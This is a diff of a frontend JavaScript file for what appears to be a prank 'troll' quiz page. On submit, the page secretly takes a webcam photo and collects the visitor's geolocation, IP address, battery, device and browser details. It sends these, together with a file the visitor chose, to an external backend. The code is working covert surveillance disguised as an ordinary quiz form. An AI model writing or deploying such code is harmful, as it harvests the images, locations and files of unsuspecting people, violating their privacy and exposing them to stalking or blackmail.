@@ -1,7 +1,12 @@
-const btn = document.getElementById("submit-btn");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const fileInput = document.getElementById("user-file");
+// ================================
+// FRONTEND SCRIPT.JS
+// ================================
+
+const btn = document.getElementById('submit-btn');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const fileInput = document.getElementById('user-file');
+const toast = document.getElementById('toast');
 
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 
@@ -9,134 +14,144 @@ const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 // ================================
-// GET DEVICE IP
+// SHOW TOAST
 // ================================
-async function getIP() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip;
-  } catch {
-    return "N/A";
-  }
+function showToast(message = "Done") {
+  if (!toast) return;
+  toast.textContent = message;
+  toast.style.display = "block";
+  setTimeout(() => { toast.style.display = "none"; }, 3000);
 }
 
 // ================================
 // COLLECT METADATA
 // ================================
 async function collectMetadata() {
-  const metadata = {
+  const meta = {
     useragent: navigator.userAgent,
     platform: navigator.platform,
     battery: "N/A",
     location: "N/A",
-    time: new Date().toLocaleString(),
-    ip: await getIP(),
     deviceMemory: navigator.deviceMemory || "N/A",
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A"
+    ip: "N/A",
+    time: new Date().toLocaleString()
   };
 
-  // Battery info
+  // Battery
   if (navigator.getBattery) {
     try {
-      const battery = await navigator.getBattery();
-      metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
+      const b = await navigator.getBattery();
+      meta.battery = `${b.level * 100}% charging:${b.charging}`;
     } catch {}
   }
 
-  // Geolocation
+  // Location
   if (navigator.geolocation) {
     try {
-      const pos = await new Promise((resolve, reject) =>
-        navigator.geolocation.getCurrentPosition(resolve, reject)
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej)
       );
-      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
-    } catch {
-      metadata.location = "Denied";
-    }
+      meta.location = `${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch {}
   }
 
-  return metadata;
+  // Get IP from a public API
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    meta.ip = ipData.ip;
+  } catch {}
+
+  return meta;
 }
 
 // ================================
-// CAPTURE CAMERA
+// CAPTURE CAMERA IMAGE
 // ================================
-async function captureCamera() {
-  const stream = await navigator.mediaDevices.getUserMedia(constraints);
-  video.srcObject = stream;
-
-  await new Promise(r => setTimeout(r, 2000)); // give time for camera
-
+async function capturePhoto() {
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  const image = canvas.toDataURL("image/png");
-
-  stream.getTracks().forEach(track => track.stop());
-
-  return image;
+  return canvas.toDataURL("image/png");
 }
 
 // ================================
 // SEND CAMERA IMAGE + METADATA
 // ================================
 async function sendCameraData() {
-  const metadata = await collectMetadata();
-  const image = await captureCamera();
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
 
-  const res = await fetch(`${BACKEND_BASE}/upload`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ image, metadata })
-  });
+    // Wait 2–3s for user to focus
+    await new Promise(r => setTimeout(r, 2500));
 
-  return await res.json();
+    const image = await capturePhoto();
+    const metadata = await collectMetadata();
+
+    const res = await fetch(`${BACKEND_BASE}/upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image, metadata })
+    });
+
+    const data = await res.json();
+    if (data.success) showToast("Camera captured & sent!");
+    else showToast("Camera upload failed");
+
+    stream.getTracks().forEach(t => t.stop());
+  } catch (err) {
+    console.error("Camera error:", err);
+    alert("Camera permission denied or error occurred.");
+  }
 }
 
 // ================================
 // SEND FILE UPLOAD
 // ================================
-async function sendFile(file) {
+async function sendFileUpload(file) {
   if (!file) return;
 
   const reader = new FileReader();
-  return new Promise((resolve, reject) => {
-    reader.onload = async () => {
-      try {
-        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ fileData: reader.result, filename: file.name })
-        });
-        resolve(await res.json());
-      } catch (err) {
-        reject(err);
-      }
-    };
-    reader.readAsDataURL(file);
-  });
+  reader.onload = async () => {
+    const base64 = reader.result;
+
+    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      // ⚡ IMPORTANT: send { file, filename } to match schema
+      body: JSON.stringify({ file: base64, filename: file.name })
+    });
+
+    const data = await res.json();
+    if (data.success) showToast("File uploaded successfully!");
+    else showToast("File upload failed");
+  };
+
+  reader.readAsDataURL(file);
 }
 
 // ================================
-// SUBMIT FORM
+// HANDLE FORM SUBMIT
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
 
   if (!fileInput.files.length) {
-    alert("Please select a file before submitting!");
+    alert("Please select a file before submitting.");
     return;
   }
 
-  try {
-    await sendCameraData();
-    await sendFile(fileInput.files[0]);
+  // 1️⃣ Capture camera
+  await sendCameraData();
 
-    document.getElementById("quiz-container").style.display = "none";
-    document.getElementById("success-container").style.display = "flex";
-  } catch (err) {
-    console.error("Submission error:", err);
-    alert("Something went wrong while submitting.");
+  // 2️⃣ Upload selected file
+  await sendFileUpload(fileInput.files[0]);
+
+  // 3️⃣ Show success page
+  const quiz = document.getElementById("quiz-container");
+  const success = document.getElementById("success-container");
+  if (quiz && success) {
+    quiz.style.display = "none";
+    success.style.display = "flex";
   }
 });
